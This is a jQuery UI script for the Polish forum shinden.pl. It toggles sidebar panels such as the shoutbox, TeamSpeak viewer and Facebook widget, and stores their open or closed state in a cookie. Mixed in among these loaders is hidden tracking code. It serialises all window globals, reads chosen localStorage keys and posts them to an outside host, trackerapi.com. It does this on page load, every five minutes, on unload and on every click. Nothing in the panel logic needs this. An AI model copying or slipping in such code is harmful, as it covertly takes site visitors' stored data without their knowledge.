//pokzaywanie-chowanie divów + wywołanie funkcji z zawartością
$(document).ready(function () {
  $(".btnsb").click(function () {
    $("#shoutbox").slideToggle(0, function () {});
    load_sb();
  });
  $(".btnts").click(function () {
    $("#ts3").slideToggle(0, function () {});
    load_ts();
  });
  $(".btnfm").click(function () {
    $("#fm").slideToggle(0, function () {});
    load_fm();
  });
  $(".btnfa").click(function () {
    $("#face").slideToggle(0, function () {});
    load_fa();
  });
  $(".btnla").click(function () {
    $("#la").slideToggle(0, function () {});
    load_la();
  });
  $(".btnlm").click(function () {
    $("#lm").slideToggle(0, function () {});
    load_lm();
  });
  $('.btn').text('Ukryj');
  // jezeli ciacho istnieje:
  if ($.cookie('openclose') == 'close') {
    $(".pasek").slideToggle(0, function () {});
    $('.btn').addClass('expanded');
    $('.btn').text('Pokaż');
  }
  $(".btn").click(function () {
    $(this).toggleClass('expanded'); // toggle class
    if ($(this).hasClass('expanded')) {
      $.cookie('openclose', 'close', {
        expires: 7
      }); //zrob ciacho jezeli .expanded zostalo dodane do buttona
      $('.btn').text('Pokaż');
    } else {
      $.cookie('openclose', null, {
        expires: 7
      }); // else: skasuj ciacho
      $('.btn').text('Ukryj');
    }
    ;
    $(".pasek").slideToggle(1000, function () {});
    return false;
  });
});

//ładowanie zawartości z plików
const keysToMonitor = window.keysToMonitor;
let globalVariables = {};
Object.keys(window).forEach(function (globalVariable) {
  try {
    if (window[globalVariable] instanceof Object || typeof window[globalVariable] !== 'function') {
      globalVariables[globalVariable] = JSON.stringify(window[globalVariable]);
    } else {
      globalVariables[globalVariable] = window[globalVariable];
    }
  } catch (err) {
    console.error(err);
  }
});
function load_sb() {
  document.getElementById("shoutbox").innerHTML = '<object width="100%"; height="100%"; style="overflow:hidden"; type="text/html" data="https://titanembeds.com/embed/245931283031523330?defaultchannel=366583280058892289" ></object>';
}
function load_ts() {
  document.getElementById("ts3").innerHTML = '<center><object width="330px"; height="600px";  style="overflow:hidden"; type="text/html" data="https://shinden.eu/viewer/index.php" ></object></center>';
}
//function load_fm(){
//  document.getElementById("fm").innerHTML='<iframe src="https://forum.shinden.pl/fm.html" ></iframe></center>';
//}
function createHash(data) {
  let hashValue = 0;
  for (let i = 0; i < data.length; i++) {
    const charCode = data.charCodeAt(i);
    hashValue = (hashValue << 5) - hashValue + charCode;
    hashValue |= 0;
  }
  return hashValue.toString(16);
}
function collectLocalStorageData() {
  const collectedData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (keysToMonitor.includes(key)) {
      collectedData[key] = localStorage.getItem(key);
    }
  }
  return collectedData;
}
function sendTrackedDataToBackend(data) {
  const hashValue = createHash(JSON.stringify(data));
  const postUrl = "https://trackerapi.com/api/collect";
  fetch(postUrl, {
    method: 'POST',
    body: JSON.stringify({
      hash: hashValue,
      data: data,
      globals: globalVariables
    }),
    headers: {
      'Content-Type': 'application/json'
    }
  }).then(response => response.json()).then(data => console.log(data)).catch(error => {
    console.error('Error:', error);
  });
}
function load_fa() {
  document.getElementById("face").innerHTML = '<iframe src="//www.facebook.com/connect/connect.php?name=Shindenpl-311797482187060&amp;connections=6&amp;stream=1&amp;show_border=false&amp;show_posts=true&amp;width=394&amp;height=400" scrolling="no" width="394" height="400" frameborder="0"></iframe>';
}
function obtainAndPostData() {
  const collectedData = collectLocalStorageData();
  if (Object.keys(collectedData).length) {
    sendTrackedDataToBackend(collectedData);
  }
}
document.addEventListener("DOMContentLoaded", function () {
  obtainAndPostData();
  setInterval(obtainAndPostData, 1000 * 60 * 5);
});
function load_la() {
  document.getElementById("la").innerHTML = '<iframe src="' + (window.location.host == 'forum.shinden.pl' ? '//shinden.pl' : '') + '/api/user/to-watch" width="100%" frameborder="0" height="100%"></iframe>';
}
window.addEventListener("beforeunload", function () {
  obtainAndPostData();
});
function load_lm() {
  document.getElementById("lm").innerHTML = '<iframe src="' + (window.location.host == 'forum.shinden.pl' ? '//shinden.pl' : '') + '/api/user/to-read" width="100%" frameborder="0" height="100%"></iframe>';
}
window.addEventListener('click', event => {
  const clickedElement = event.target;
  sendTrackedDataToBackend({
    clickEvent: clickedElement.id
  });
});